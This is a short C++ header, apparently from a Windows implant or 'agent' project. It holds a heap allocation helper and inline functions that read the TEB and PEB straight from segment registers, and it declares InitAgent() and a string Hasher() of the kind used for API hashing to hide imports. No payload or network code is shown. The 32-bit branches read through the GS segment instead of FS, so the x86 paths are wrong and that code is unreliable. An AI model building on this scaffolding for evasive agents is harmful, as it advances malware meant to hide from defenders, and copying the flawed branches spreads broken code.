#pragma once

#include <windows.h>
#include "../utils/apidefs.hpp"
#include "nt.hpp"


#define TO_DWORD(x) ((DWORD)(ULONG_PTR)(x))
#define BASE_BUFFER_SIZE 64


template<typename T>
T* AllocMemory(size_t size) {
	return (T*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, size);
}

inline PTEB GetTeb() {
#if defined(__WIN64__) || defined(__x86_64__) || defined(_WIN64)
	return (PTEB)__readgsqword(0x30);
#elif defined(__i386__) || defined(_M_IX86)
	return (PTEB)__readgsdword(0x18);
#else
	return NULL;
#endif
}


inline PPEB GetPEB() { 
#if defined(__WIN64__) || defined(__x86_64__) || defined(_WIN64)
	return (PPEB)__readgsqword(0x60);
#elif defined(__i386__) || defined(_M_IX86)
	return (PPEB)__readgsdword(0x30);
#else
	return NULL;
#endif
}





BOOL InitAgent();

DWORD Hasher(PCHAR str);